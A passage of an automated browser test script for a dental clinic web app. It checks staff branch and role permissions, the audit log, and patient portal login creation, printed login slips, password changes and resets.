  // dha.reception is on All (end of the step above). Limit them to DHA, switch DHA off, then choose All branches.
  let m = await openBranches(p7, branchLogin);
  await m.getByLabel('DHA Karachi', { exact: true }).check();
  await m.getByRole('button', { name: 'Save' }).click();
  await p7.waitForSelector(`tr:has-text("${branchLogin}") td:text-is("DHA Karachi")`);
  await switchDha(false);
  m = await openBranches(p7, branchLogin);
  const allBox = m.getByLabel('All branches', { exact: true });
  const sure = m.getByLabel(/may see every branch/);
  const keptNote = m.getByText(/Also kept: 1 switched-off branch/);
  assert.ok(!(await allBox.isChecked()) && await keptNote.isVisible(), 'limited to a switched-off branch: All is off and the kept note shows');
  // Clearing the last tick keeps the limit (nothing else to fall back to), as before.
  await m.getByLabel('Islamabad', { exact: true }).check();
  await m.getByLabel('Islamabad', { exact: true }).uncheck();
  assert.ok(!(await allBox.isChecked()), 'a switched-off branch is kept: clearing the last tick does not turn All on');
  // An explicit tick on All stands: it used to clear itself again straight away.
  await allBox.check();
  assert.ok(await allBox.isChecked(), 'All branches stays ticked');
  assert.ok(await sure.isVisible(), 'lifting the limit still asks');
  assert.ok(!(await keptNote.isVisible()), 'the kept note goes while All is chosen');
  // Changing their mind: a branch tick takes All off again and brings the note back.
  await m.getByLabel('Islamabad', { exact: true }).check();
  assert.ok(!(await allBox.isChecked()) && await keptNote.isVisible() && !(await sure.isVisible()), 'ticking a branch undoes All');
  await m.getByLabel('Islamabad', { exact: true }).uncheck();
  await allBox.check();
  // Save alone does not lift the limit; the tick does, and the switched-off branch is let go with it.
  await m.getByRole('button', { name: 'Save' }).click();
  await m.locator('[data-field-error]').waitFor();
  assert.equal((await branchesCell(p7, branchLogin).textContent()).trim(), '1 switched-off branch', 'nothing saved without the tick');
  await sure.check();
  await m.getByRole('button', { name: 'Save' }).click();
  await p7.waitForSelector(`tr:has-text("${branchLogin}") td:text-is("All")`);
  await switchDha(true);
  assert.equal((await branchesCell(p7, branchLogin).textContent()).trim(), 'All', 'the account is on All, with no limit left behind');
});
await step('An account limited to no branch is shown as locked out and can be repaired from the dialog', async () => {
  // The branches form cannot make this; a mistyped SQL fix can. Create one directly through the demo data layer.
  await p7.evaluate(async () => {
    const { state } = await import('/js/state.js');
    await state.data.createStaff({ full_name: 'Locked Out Test', email: 'locked.out@dralirashid.com', role: 'front_desk', branch_ids: [], restrict_to_branches: true });
  });
  await p7.goto(BASE + '#/staff/admin?tab=access');
  await p7.goto(BASE + '#/staff/admin?tab=staff');
  const login = 'locked.out@dralirashid.com';
  await p7.waitForSelector(`tr:has-text("${login}")`);
  assert.equal((await branchesCell(p7, login).textContent()).trim(), 'None (locked out)');
  const m = await openBranches(p7, login);
  assert.match(await m.innerText(), /cannot open any patient list/);
  assert.ok(!(await m.getByLabel('All branches', { exact: true }).isChecked()), 'not shown as All');
  // Save alone changes nothing: it must not quietly give every branch.
  await m.getByRole('button', { name: 'Save' }).click();
  await p7.waitForSelector('.toast:has-text("Nothing changed")');
  assert.equal((await branchesCell(p7, login).textContent()).trim(), 'None (locked out)');
  await m.getByLabel('Gulshan (RJ Mall)', { exact: true }).check();
  await m.getByRole('button', { name: 'Save' }).click();
  await p7.waitForSelector(`tr:has-text("${login}") td:text-is("Gulshan (RJ Mall)")`);
});
await step('A user manager has no Branches button on their own row, and the data layer refuses it too', async () => {
  // Give the sample coordinator the "manage staff accounts" permission for this person only, then sign in as them.
  const setManage = (on) => p7.evaluate(async (v) => { const { state } = await import('/js/state.js'); await state.data.setOverride('s-coord', 'users.manage', v); }, on);
  const logOut = async () => { await p7.getByRole('button', { name: 'Try another role' }).click(); await p7.waitForSelector('.door'); };
  await setManage(true);
  try {
    await logOut();
    await loginAs(p7, 'Clinic coordinator');
    await p7.goto(BASE + '#/staff/admin?tab=staff');
    await p7.waitForSelector('tr:has-text("Clinic coordinator (sample)")');
    const branchButtons = (name) => p7.locator('tr', { hasText: name }).getByRole('button', { name: /^Branches/ }).count();
    assert.equal(await branchButtons('Clinic coordinator (sample)'), 0, 'not on their own row');
    assert.equal(await branchButtons('Dr. Ali Rashid'), 0, 'not on the admin row');
    assert.equal(await branchButtons('Front desk (Gulshan)'), 1, "still on other people's rows");
    const tryChange = (id) => p7.evaluate(async (who) => {
      const { state } = await import('/js/state.js');
      try { await state.data.updateStaffBranches(who, [1]); return 'saved'; } catch (e) { return e.message; }
    }, id);
    assert.match(await tryChange('s-coord'), /cannot change your own/);
    assert.match(await tryChange('s-admin'), /Only admin/);
    // The same for the Role button: not on their own row nor an admin's, and the data layer refuses it as the database does.
    const roleButtons = (name) => p7.locator('tr', { hasText: name }).getByRole('button', { name: /^Role,/ }).count();
    assert.equal(await roleButtons('Clinic coordinator (sample)'), 0, 'no Role button on their own row');
    assert.equal(await roleButtons('Dr. Ali Rashid'), 0, 'no Role button on the admin row');
    assert.equal(await roleButtons('Front desk (Gulshan)'), 1, "Role button on other people's rows");
    const tryRole = (id, role) => p7.evaluate(async ([who, to]) => {
      const { state } = await import('/js/state.js');
      try { await state.data.updateStaffRole(who, to); return 'saved'; } catch (e) { return e.message; }
    }, [id, role]);
    assert.match(await tryRole('s-coord', 'front_desk'), /cannot change your own/);
    assert.match(await tryRole('s-admin', 'front_desk'), /Only admin can change an admin/);
    assert.match(await tryRole('s-fd-gul', 'admin'), /Only admin can create or promote/);
    assert.equal(await tryRole('s-fd-gul', 'assistant'), 'saved', 'a user manager may change someone else\'s role');
    assert.equal(await tryRole('s-fd-gul', 'front_desk'), 'saved');
  } finally {
    // Pass or fail, the steps after this one need Dr. Ali signed in and the coordinator back to normal.
    if (await p7.getByRole('button', { name: 'Try another role' }).count()) await logOut();
    await loginAs(p7, 'Dr. Ali Rashid');
    await setManage(null);
  }
});
await step('Dr. Ali changes the role of a staff member (front desk to assistant), the table follows, personal access stays', async () => {
  await p7.goto(BASE + '#/staff/admin?tab=staff');
  await p7.waitForSelector(`tr:has-text("${branchLogin}")`);
  const row = p7.locator('tr', { hasText: branchLogin });
  const roleCell = () => row.locator('td').nth(2);
  const idOf = () => p7.evaluate(async (email) => { const { state } = await import('/js/state.js'); return (await state.data.staffList()).find((s) => s.email === email).id; }, branchLogin);
  // The Role button sits next to Branches, on exactly the rows that have Branches (not the admin row, not your own).
  assert.equal(await p7.getByRole('button', { name: /^Role,/ }).count(), await p7.getByRole('button', { name: /^Branches,/ }).count(), 'Role is shown wherever Branches is');
  assert.equal(await p7.locator('tr', { hasText: 'Dr. Ali Rashid' }).getByRole('button', { name: /^Role,/ }).count(), 0, 'no Role button on the admin row');
  const labels = await row.getByRole('button').allInnerTexts();
  assert.equal(labels.indexOf('Role'), labels.indexOf('Branches') + 1, 'Role comes right after Branches');
  assert.equal((await roleCell().textContent()).trim(), 'Front desk');
  // A personal access tick set before the change must still be there after it.
  const id = await idOf();
  await p7.evaluate(async (who) => { const { state } = await import('/js/state.js'); await state.data.setOverride(who, 'billing.view', true); }, id);
  try {
    let m;
    const openRole = async () => { await row.getByRole('button', { name: /^Role,/ }).click(); m = p7.locator('.modal'); return m.locator('select'); };
    let sel = await openRole();
    assert.deepEqual(await sel.locator('option').allInnerTexts(), ['Front desk', 'Assistant', 'Doctor', 'Clinic coordinator', 'Accountant'], 'the five working roles, never Admin');
    assert.equal(await sel.inputValue(), 'front_desk', 'pre-selected with the current role');
    assert.match(await m.innerText(), /Their menus and permissions change to the Front desk ones; personal access ticks stay/);
    // Save with the current role changes nothing and says so.
    await m.getByRole('button', { name: 'Save' }).click();
    await p7.waitForSelector('.toast:has-text("Nothing changed")');
    assert.ok(await m.isVisible(), 'the dialog stays open');
    assert.equal((await roleCell().textContent()).trim(), 'Front desk');
    await sel.selectOption('assistant');
    assert.match(await m.innerText(), /Their menus and permissions change to the Assistant ones; personal access ticks stay/, 'the note names the chosen role');
    await m.getByRole('button', { name: 'Save' }).click();
    await p7.waitForSelector(`tr:has-text("${branchLogin}") td:text-is("Assistant")`);
    await p7.waitForSelector('.toast:has-text("is now Assistant")');
    assert.equal(await p7.locator('.modal').count(), 0, 'the dialog closes after saving');
    const stays = await p7.evaluate(async (who) => { const { state } = await import('/js/state.js'); const g = await state.data.permissionGrid(); return g.overrides[who]?.['billing.view']; }, id);
    assert.equal(stays, true, 'the personal access tick stayed through the role change');
    // Reopened, the dialog is pre-selected from the saved role. Put the account back to front desk.
    sel = await openRole();
    assert.equal(await sel.inputValue(), 'assistant', 'pre-selected from the saved role');
    await sel.selectOption('front_desk');
    await m.getByRole('button', { name: 'Save' }).click();
    await p7.waitForSelector(`tr:has-text("${branchLogin}") td:text-is("Front desk")`);
  } finally {
    await p7.evaluate(async (who) => { const { state } = await import('/js/state.js'); await state.data.setOverride(who, 'billing.view', null); }, id);
  }
});
await step('Admin → Audit log lists sign-ins', async () => {
  await p7.goto(BASE + '#/staff/admin?tab=audit');
  await p7.waitForSelector('h2:text("Logins")');
  await p7.waitForSelector('table.list tr:has-text("Dr. Ali Rashid")');
  assert.ok(await p7.locator('h2:text("Recent changes")').count());
});

// ------------------------------------------------------------- portal login made at the clinic
// The demo keeps its "login server" in the page's memory, so the staff member and the patient share one page (hash changes only).
const pl = await newPage();
let slip = {};
// Logging out finishes by sending the page to the home page: wait for that, or it lands on top of whatever the test opened next.
const logOut = async ({ staff = false } = {}) => {
  if (staff) await pl.getByRole('button', { name: /^Account menu/ }).click();
  await pl.getByRole('button', { name: 'Log out' }).click();
  await pl.waitForFunction(() => location.hash === '#/');
  await pl.waitForSelector('.door');
};
const openPatient = async (name) => {
  await pl.goto(BASE + `#/staff/patients?q=${encodeURIComponent(name)}`);
  await pl.locator('table.list tbody tr', { hasText: name }).locator('a').first().click();
  await pl.waitForSelector(`h1:has-text("${name}")`);
};
await step('portal login buttons: "Create portal login" for a patient with none, the email invitation only when there is an email', async () => {
  await loginAs(pl, 'Dr. Ali Rashid');
  await openPatient('Hamza Qureshi'); // no email on file
  await pl.getByRole('button', { name: 'Create portal login' }).waitFor();
  assert.equal(await pl.getByRole('button', { name: 'Invite to patient portal' }).count(), 0, 'no email: nothing to invite');
  await pl.locator('.portal-login-line', { hasText: 'Portal login: none yet' }).waitFor();
  await openPatient('Zainab Rizvi'); // has an email
  await pl.getByRole('button', { name: 'Create portal login' }).waitFor();
  await pl.getByRole('button', { name: 'Invite to patient portal' }).waitFor();
  await pl.locator('.portal-login-line', { hasText: 'Portal login: none yet' }).waitFor();
  await openPatient('Areeba Siddiqui'); // already has a login with her own email
  await pl.waitForSelector('h1:has-text("Areeba Siddiqui")');
  assert.equal(await pl.getByRole('button', { name: 'Create portal login' }).count(), 0);
  await pl.locator('.portal-login-line', { hasText: 'Portal login: own email (invited)' }).waitFor();
  assert.equal(await pl.getByRole('button', { name: 'Reset portal password' }).count(), 0, 'a login with the patient\'s own email is reset by email, not here');
});
await step('staff create a portal login: the username, an easy password, and a login slip that prints on one small page', async () => {
  await openPatient('Hamza Qureshi');
  await pl.getByRole('button', { name: 'Create portal login' }).click();
  const m = pl.locator('.modal');
  assert.equal(await m.locator('input[readonly]').inputValue(), 'hamzaqureshi-9812@dralirashid.com');
  const generated = await m.getByLabel('Password').inputValue();
  assert.match(generated, /^[a-hj-km-np-z]{3,5}-[a-hj-km-np-z]{3,5}-[a-hj-km-np-z]{3,5}-[2-9]{4}$/, 'three short words and four digits, nothing that can be misread');
  await m.getByRole('button', { name: 'New one' }).click();
  assert.notEqual(await m.getByLabel('Password').inputValue(), generated, '"New one" gives another');
  // Copy is for the username only: the slip is how the password is handed over (a copied password stays in the clipboard history of the front desk).
  assert.equal(await m.getByRole('button', { name: 'Copy' }).count(), 1, 'one Copy button');
  assert.equal(await m.locator('.inline:has(input[readonly]) button', { hasText: 'Copy' }).count(), 1, 'and it is the username\'s');
  assert.deepEqual(await m.locator('.inline:has(input[autocomplete=off]) button').allInnerTexts(), ['New one'], 'the password box has only "New one"');
  await m.getByLabel('Password').fill('short');
  await m.getByRole('button', { name: 'Create login' }).click();
  await m.locator('.field-error', { hasText: 'at least 10 characters' }).waitFor();
  await m.getByLabel('Password').fill('0300123456789');
  await m.getByRole('button', { name: 'Create login' }).click();
  await m.locator('.field-error', { hasText: 'only digits' }).waitFor();
  slip = { username: 'hamzaqureshi-9812@dralirashid.com', password: 'sunny-grape-4827' };
  await m.getByLabel('Password').fill(slip.password);
  await m.getByRole('button', { name: 'Create login' }).click();
  await pl.waitForSelector('.login-slip');
  const text = await pl.locator('.login-slip').innerText();
  for (const part of ['Dr. Ali Rashid\'s Dental Clinic', 'www.dralirashid.com', slip.username, slip.password, 'Hamza Qureshi', 'Mr# 9812', 'You will be asked to choose your own password the first time you log in']) assert.ok(text.includes(part), `slip shows "${part}"`);
  assert.equal(await pl.locator('.modal').count(), 1, 'only the slip dialog is open');
  await shot(pl, '15-login-slip');
  // Print: the slip is the only thing on the paper, and it is one page.
  await pl.evaluate(() => { window.__print = []; window.print = () => { window.__print.push({ printing: document.body.classList.contains('printing'), areas: [...document.querySelectorAll('.print-area')].map((a) => a.className) }); window.dispatchEvent(new Event('afterprint')); }; });
  await pl.getByRole('button', { name: 'Print login slip' }).click();
  const printed = await pl.evaluate(() => ({ calls: window.__print, still: document.body.classList.contains('printing') }));
  assert.equal(printed.calls.length, 1);
  assert.equal(printed.calls[0].printing, true, 'the print rules were switched on for the slip');
  assert.deepEqual(printed.calls[0].areas, ['login-slip print-area'], 'only the slip is a print area');
  assert.equal(printed.still, false, 'and switched off again afterwards');
  const pdf = await pl.pdf({ preferCSSPageSize: true, printBackground: true });
  const pages = (pdf.toString('latin1').match(/\/Type\s*\/Page[^s]/g) || []).length;
  assert.equal(pages, 1, 'the slip prints on one page');
  const box = pdf.toString('latin1').match(/MediaBox\s*\[\s*0\s+0\s+([\d.]+)\s+([\d.]+)\s*\]/);
  assert.ok(box && Math.abs(Number(box[1]) - 297.6) < 3 && Math.abs(Number(box[2]) - 419.5) < 3, `the page is A6 (105 x 148 mm), not ${box?.slice(1, 3).join(' x ')}`);
  await pl.getByRole('button', { name: 'Close' }).first().click();
  await pl.waitForSelector('h1:has-text("Hamza Qureshi")');
  await pl.getByRole('button', { name: 'Reset portal password' }).waitFor();
  assert.equal(await pl.getByRole('button', { name: 'Create portal login' }).count(), 0, 'the login exists now');
  // The password was shown only in the dialog and on the slip: it is not left anywhere on the page.
  assert.equal((await pl.locator('main, #app').first().innerText()).includes(slip.password), false);
  // The patient record now says which login it is (and the username to tell the patient again without a reset).
  await pl.locator('.portal-login-line', { hasText: 'Portal login: ' + slip.username }).waitFor();
});
await step('the Portal login line says "could not check" with a retry when the function cannot be asked, and "Update the admin-users function first." when it is old', async () => {
  const stub = (message) => pl.evaluate(async (m) => {
    const { state } = await import('/js/state.js');
    window.__realInfo ||= state.data.portalLoginInfo;
    state.data.portalLoginInfo = m === null ? window.__realInfo : async () => { throw new Error(m); };
  }, message);
  await stub('Update the admin-users function first.'); // what the website says when the function does not know the action yet
  await openPatient('Hamza Qureshi');
  const line = pl.locator('.portal-login-line');
  await line.getByText('could not check').waitFor();
  assert.match(await line.innerText(), /Update the admin-users function first\./);
  assert.equal(await pl.getByRole('button', { name: 'Reset portal password' }).count(), 0, 'no reset button on a login that could not be checked');
  await stub(null); // the function answers again
  await line.getByRole('button', { name: 'Try again' }).click();
  await line.getByText(slip.username).waitFor();
  await pl.getByRole('button', { name: 'Reset portal password' }).waitFor();
  expectErrors(/Update the admin-users function first/);
});
await step('the patient logs in with just the short username, must choose their own password first, then lands in the portal', async () => {
  await logOut({ staff: true });
  await pl.setViewportSize({ width: 390, height: 844 });
  await pl.goto(BASE + '#/login/patient');
  const form = pl.locator('form');
  await form.locator('input[name=username]').waitFor();
  await form.locator('input[name=username]').fill('hamzaqureshi-9812');
  await form.locator('input[type=password]').fill('not-the-password-1');
  await form.locator('input[type=password]').press('Enter'); // the card re-centres when a message goes away, so a click can miss the moving button
  await pl.locator('.field-error', { hasText: 'username (or email) and password do not match' }).waitFor();
  await form.locator('input[name=username]').fill('  HamzaQureshi-9812 ');
  await form.locator('input[type=password]').fill(slip.password);
  await form.locator('input[type=password]').press('Enter'); // the card re-centres when a message goes away, so a click can miss the moving button
  await pl.waitForSelector('h1:has-text("Choose your own password")');
  assert.equal(await pl.locator('h1:has-text("Hello")').count(), 0, 'nothing of the portal before the new password');
  assert.equal(await pl.locator('.photo-grid, .stat-row').count(), 0);
  await shot(pl, '16-choose-password');
  const next = pl.locator('input[autocomplete=new-password]');
  const save = pl.getByRole('button', { name: 'Save my password' });
  await next.nth(0).fill('abc');
  await next.nth(1).fill('abc');
  await save.click();
  await pl.locator('.field-error', { hasText: 'at least 8 characters' }).waitFor();
  await next.nth(0).fill('my-own-pass-77');
  await next.nth(1).fill('my-own-pass-78');
  await save.click();
  await pl.locator('.field-error', { hasText: 'two passwords are different' }).waitFor();
  await next.nth(0).fill(slip.password);
  await next.nth(1).fill(slip.password);
  await save.click();
  await pl.locator('[role=alert]', { hasText: 'different from your current one' }).first().waitFor();
  await next.nth(0).fill('my-own-pass-77');
  await next.nth(1).fill('my-own-pass-77');
  await save.click();
  await pl.waitForSelector('h1:has-text("Hello, Hamza")');
  await pl.getByRole('button', { name: 'Change password' }).waitFor();
  await shot(pl, '17-portal-after-first-login');
});
await step('the patient can change the password later from the portal menu, and the old one stops working', async () => {
  await pl.getByRole('button', { name: 'Change password' }).click();
  const dlg = pl.locator('.modal');
  await dlg.getByLabel('New password').fill('later-pass-4455');
  await dlg.getByLabel('Type it again').fill('later-pass-9999');
  await dlg.getByRole('button', { name: 'Save password' }).click();
  await dlg.locator('.field-error', { hasText: 'two passwords are different' }).waitFor();
  await dlg.getByLabel('New password').fill('later-pass-4455');
  await dlg.getByLabel('Type it again').fill('later-pass-4455');
  await dlg.getByRole('button', { name: 'Save password' }).click();
  await pl.waitForSelector('.toast:has-text("Your password has been changed")');
  await logOut();
  await pl.goto(BASE + '#/login/patient');
  const form = pl.locator('form');
  await form.locator('input[name=username]').fill(slip.username); // the whole address works too
  await form.locator('input[type=password]').fill('my-own-pass-77');
  await form.locator('input[type=password]').press('Enter'); // the card re-centres when a message goes away, so a click can miss the moving button
  await pl.locator('.field-error', { hasText: 'do not match' }).waitFor();
  await form.locator('input[type=password]').fill('later-pass-4455');
  await form.locator('input[type=password]').press('Enter'); // the card re-centres when a message goes away, so a click can miss the moving button
  await pl.waitForSelector('h1:has-text("Hello, Hamza")'); // no "choose a password" screen again
  assert.equal(await pl.locator('h1:has-text("Choose your own password")').count(), 0);
});
await step('"Forgot password" for a clinic username says to ask the clinic (no email); a staff address is told the staff way', async () => {
  await logOut();
  await pl.goto(BASE + '#/login/patient');
  const form = pl.locator('form');
  await form.getByRole('button', { name: 'Forgot password?' }).click();
  await pl.locator('.field-error', { hasText: 'Type your username or email address first' }).waitFor();
  await form.locator('input[name=username]').fill('hamzaqureshi-9812');
  await form.getByRole('button', { name: 'Forgot password?' }).click();
  await pl.locator('p.muted', { hasText: 'Ask the clinic to reset your password' }).waitFor();
  await form.locator('input[name=username]').fill('someone@example.com');
  await form.getByRole('button', { name: 'Forgot password?' }).click();
  await pl.locator('.field-error', { hasText: 'Something went wrong' }).waitFor(); // a real email goes to the email reset (the demo has none, so it fails the way any failed reset does)
});
await step('the patient login page points to the slip and to the clinic, for the hint and for "Forgot password" (WhatsApp link included)', async () => {
  await pl.goto(BASE + '#/login/patient');
  const form = pl.locator('form');
  await form.locator('input[name=username]').waitFor();
  const text = await form.innerText();
  assert.match(text, /Use the username on the slip the clinic gave you\. Patients who were invited by email use that email address\./);
  assert.doesNotMatch(text, /If you gave the clinic your email address/, 'no longer sends a clinic-made login to the real email');
  await form.locator('input[name=username]').fill('hamzaqureshi-9812');
  await form.getByRole('button', { name: 'Forgot password?' }).click();
  const note = form.locator('p.muted', { hasText: 'Ask the clinic to reset your password' });
  await note.waitFor();
  const wa = note.getByRole('link', { name: /message the clinic on WhatsApp/ });
  assert.match(await wa.getAttribute('href'), /^https:\/\/wa\.me\/92\d{10}\?text=/, 'the clinic\'s WhatsApp chat');
  assert.equal(await wa.getAttribute('target'), '_blank');
  assert.match(await wa.getAttribute('rel'), /noopener/);
  // A real email: the reset email goes out (stand-in here), and the note says what to do if the login came from the clinic.
  await pl.evaluate(async () => { const { state } = await import('/js/state.js'); state.data.sendPasswordReset = async () => {}; });
  await form.locator('input[name=username]').fill('hamza@example.com');
  await form.getByRole('button', { name: 'Forgot password?' }).click();
  const emailNote = form.locator('p.muted', { hasText: 'a link to set a new password is on its way' });
  await emailNote.waitFor();
  assert.match(await emailNote.innerText(), /If the clinic gave you a username on a slip, no link will come: use that username here instead, or message the clinic on WhatsApp/);
  assert.equal(await emailNote.getByRole('link', { name: /WhatsApp/ }).count(), 1);
});
await step('staff reset the password of a login made at the clinic: same username, a new slip, and the patient must choose again', async () => {
  await pl.setViewportSize({ width: 1366, height: 860 });
  await pl.goto(BASE + '#/login/staff');
  await pl.getByRole('button', { name: /Dr. Ali Rashid/ }).click();
  await pl.waitForSelector('.topbar');
  await openPatient('Hamza Qureshi');
  await pl.getByRole('button', { name: 'Reset portal password' }).click();
  const m = pl.locator('.modal');
  assert.equal(await m.locator('input[readonly]').inputValue(), slip.username);
  // Honest about what a reset does: it does not end a session that is already open.
  const said = await m.innerText();
  assert.match(said, /Saving signs the patient out everywhere: the old password stops working at once/);
  assert.doesNotMatch(said, /stops working as soon as you save/);
  slip.password = 'peach-zebra-5936';
  await m.getByLabel('Password').fill(slip.password);
  await m.getByRole('button', { name: 'Reset password' }).click();
  await pl.waitForSelector('.login-slip');
  assert.ok((await pl.locator('.login-slip').innerText()).includes(slip.password));
  await pl.getByRole('button', { name: 'Close' }).first().click();
  await logOut({ staff: true });
  await pl.goto(BASE + '#/login/patient');
  const form = pl.locator('form');
  await form.locator('input[name=username]').fill('hamzaqureshi-9812');
  await form.locator('input[type=password]').fill('later-pass-4455'); // the old password no longer works
  await form.locator('input[type=password]').press('Enter'); // the card re-centres when a message goes away, so a click can miss the moving button
  await pl.locator('.field-error', { hasText: 'do not match' }).waitFor();
  await form.locator('input[type=password]').fill(slip.password);
  await form.locator('input[type=password]').press('Enter'); // the card re-centres when a message goes away, so a click can miss the moving button
  await pl.waitForSelector('h1:has-text("Choose your own password")');
});
await step('a staff login cannot be given a name that looks like a patient login', async () => {
  await logOut();
  await pl.goto(BASE + '#/login/staff');
  await pl.getByRole('button', { name: /Dr. Ali Rashid/ }).click();
  await pl.waitForSelector('.topbar');
  await pl.goto(BASE + '#/staff/admin?tab=staff');
  await pl.getByRole('button', { name: 'New staff account' }).click();
  const m = pl.locator('.modal');
  await m.getByPlaceholder('Full name').fill('Patient Lookalike');
  await m.locator('input[type=email]').fill('lookalike-1705@dralirashid.com');
  await m.getByRole('button', { name: 'Create account' }).click();
  await pl.locator('.toast', { hasText: 'shape of a patient login' }).waitFor();
});

await step('the invitation by email is refused for an address at the clinic domain, and still works for a real one', async () => {
  await pl.keyboard.press('Escape').catch(() => {});
  const ids = await pl.evaluate(async () => {
    const { state } = await import('/js/state.js');
    const mk = async (full_name, email) => (await state.data.createPatient({ full_name, phone: '0300 1112223', email, first_branch_id: 1 })).id;
    return { planted: await mk('Planted Address', 'newdoc@dralirashid.com'), real: await mk('Real Address', 'real.address@example.com') };
  });
  await pl.goto(BASE + `#/staff/patient/${ids.planted}`);
  await pl.waitForSelector('h1:has-text("Planted Address")');
  await pl.getByRole('button', { name: 'Invite to patient portal' }).click();
  await pl.locator('.toast', { hasText: 'Use Create portal login for clinic usernames.' }).waitFor();
  await pl.locator('.portal-login-line', { hasText: 'Portal login: none yet' }).waitFor(); // nothing was linked
  await pl.goto(BASE + `#/staff/patient/${ids.real}`);
  await pl.waitForSelector('h1:has-text("Real Address")');
  await pl.getByRole('button', { name: 'Invite to patient portal' }).click();
  await pl.locator('.toast', { hasText: 'Invitation sent to real.address@example.com' }).waitFor();
  await pl.locator('.portal-login-line', { hasText: 'Portal login: own email (invited)' }).waitFor();
  expectErrors(/Use Create portal login for clinic usernames/);
});

await step('the login slip keeps the username in one piece before the @, sets a long one smaller, and even the longest username prints on one A6 page', async () => {
  const name = 'Muhammad Abdul Rehman Siddiqui Al Hashmi'; // the name part is cut to 24 letters
  const cases = [['Ali Rashid', '1705'], [name, '1705'], [name, '9'.repeat(10)], [name, '9'.repeat(30)]]; // 14, 29, 35 and 55 characters before the @
  const measured = await pl.evaluate(async ({ cases }) => {
    const { loginSlip } = await import('/js/views/staff/portal-login.js');
    const holder = document.createElement('div');
    holder.style.cssText = 'position:fixed;left:0;top:0;width:351px;background:#fff;z-index:99999'; // an A6 page between its 6 mm margins, on screen
    document.body.append(holder);
    const rows = [];
    for (const [fullName, mr] of cases) {
      const username = fullName.toLowerCase().replace(/[^a-z0-9]/g, '').slice(0, 24) + '-' + mr + '@dralirashid.com';
      const slip = loginSlip({ full_name: fullName, mr_number: mr }, username, 'queen-sheep-zebra-9876');
      holder.replaceChildren(slip);
      const user = slip.querySelector('.slip-user');
      const parts = [...user.querySelectorAll('.slip-nowrap')];
      const edge = slip.getBoundingClientRect().right - parseFloat(getComputedStyle(slip).paddingRight);
      const pw = [...slip.querySelectorAll('.slip-value')].at(-1);
      rows.push({
        username, text: user.textContent, font: parseFloat(getComputedStyle(user).fontSize), lines: parts.map((s) => s.getClientRects().length),
        inside: parts.every((s) => s.getBoundingClientRect().right <= edge + 0.5), passwordFits: pw.scrollWidth <= pw.clientWidth + 0.5,
        domainBelow: parts.length === 2 ? parts[1].getBoundingClientRect().top >= parts[0].getBoundingClientRect().bottom - 1 : null,
      });
    }
    holder.remove();
    return rows;
  }, { cases });
  for (const r of measured) {
    assert.equal(r.text, r.username, 'the markup does not change the text');
    assert.deepEqual(r.lines, [1, 1], `${r.username}: the name, dash and Mr# never split over two lines (and the domain stays whole)`);
    assert.ok(r.inside, `${r.username} fits inside the slip`);
    assert.ok(r.passwordFits, `the password of a slip with ${r.username} fits too`);
  }
  const sizes = measured.map((r) => r.font);
  assert.ok(sizes[0] > sizes[1] && sizes[1] > sizes[2] && sizes[2] > sizes[3], `a longer username is set smaller: ${sizes.join(' > ')}`);
  assert.ok(measured[3].domainBelow || measured[3].domainBelow === false, 'the longest wraps (or not) only between the name part and the @');
  // The longest one on the real slip dialog prints on one A6 page.
  await pl.evaluate(async ({ username }) => {
    const { showLoginSlip } = await import('/js/views/staff/portal-login.js');
    showLoginSlip({ full_name: 'Muhammad Abdul Rehman Siddiqui Al Hashmi', mr_number: '9'.repeat(30) }, username, 'queen-sheep-zebra-9876');
  }, { username: measured[3].username });
  await pl.waitForSelector('.login-slip');
  const pdf = await pl.pdf({ preferCSSPageSize: true, printBackground: true });
  const pages = (pdf.toString('latin1').match(/\/Type\s*\/Page[^s]/g) || []).length;
  assert.equal(pages, 1, 'the longest username still prints on one page');
  const box = pdf.toString('latin1').match(/MediaBox\s*\[\s*0\s+0\s+([\d.]+)\s+([\d.]+)\s*\]/);
  assert.ok(box && Math.abs(Number(box[1]) - 297.6) < 3 && Math.abs(Number(box[2]) - 419.5) < 3, 'and it is A6');
  await pl.getByRole('button', { name: 'Close' }).first().click();
});

// Makes a portal login for a new patient the way the front desk does, and returns what is on the slip.
const makeLoginFor = async (fullName) => {
  await pl.evaluate(async (n) => { const { state } = await import('/js/state.js'); await state.data.createPatient({ full_name: n, phone: '0300 1112223', first_branch_id: 1 }); }, fullName);
  await openPatient(fullName);
  await pl.getByRole('button', { name: 'Create portal login' }).click();
  const m = pl.locator('.modal');
  const made = { username: await m.locator('input[readonly]').inputValue(), password: await m.getByLabel('Password').inputValue() };
  await m.getByRole('button', { name: 'Create login' }).click();
  await pl.waitForSelector('.login-slip');
  await pl.getByRole('button', { name: 'Close' }).first().click();
  return made;
};
// Logs a patient in with the slip and fills the "Choose your own password" screen (with the stand-in for getPatient already in place when asked).
const firstLogin = async (made, { failPortal = false, next = 'my-own-pass-88' } = {}) => {
  await logOut({ staff: true });
  await pl.goto(BASE + '#/login/patient');
  const form = pl.locator('form');
  await form.locator('input[name=username]').fill(made.username.split('@')[0]);
  await form.locator('input[type=password]').fill(made.password);
  await form.locator('input[type=password]').press('Enter');
  await pl.waitForSelector('h1:has-text("Choose your own password")');
  if (failPortal) {
    await pl.evaluate(async () => {
      const { state } = await import('/js/state.js');
      window.__realGetPatient ||= state.data.getPatient;
      state.data.getPatient = async () => { throw new Error('Failed to fetch'); }; // the connection drops right after the password is saved
    });
  }
  const fields = pl.locator('input[autocomplete=new-password]');
  await fields.nth(0).fill(next);
  await fields.nth(1).fill(next);
  await pl.getByRole('button', { name: 'Save my password' }).click();
};
const restorePortal = () => pl.evaluate(async () => { const { state } = await import('/js/state.js'); if (window.__realGetPatient) state.data.getPatient = window.__realGetPatient; });

await step('after the forced new password, a portal that cannot load shows a card with "Try again" instead of a "Loading your account…" that never ends', async () => {
  const made = await makeLoginFor('Retry Card');
  await firstLogin(made, { failPortal: true });
  await pl.getByRole('heading', { name: 'We could not open your account' }).waitFor();
  const card = await pl.locator('.login-card').innerText();
  assert.match(card, /Your new password is saved\./);
  assert.match(card, /We could not reach the clinic system/, 'in the patient\'s words, no database text');
  assert.equal(await pl.getByText('Loading your account').count(), 0, 'not a stuck loading screen');
  assert.equal(await pl.getByRole('button', { name: 'Try again' }).count(), 1);
  assert.equal(await pl.getByRole('button', { name: 'Log out' }).count(), 1);
  assert.ok(await pl.evaluate(() => document.activeElement?.tagName === 'H1'), 'the heading has the focus');
  await shot(pl, '18-portal-could-not-open');
  await pl.getByRole('button', { name: 'Try again' }).click(); // still failing: the card comes back
  await pl.getByRole('heading', { name: 'We could not open your account' }).waitFor();
  await restorePortal();
  await pl.getByRole('button', { name: 'Try again' }).click(); // the connection is back
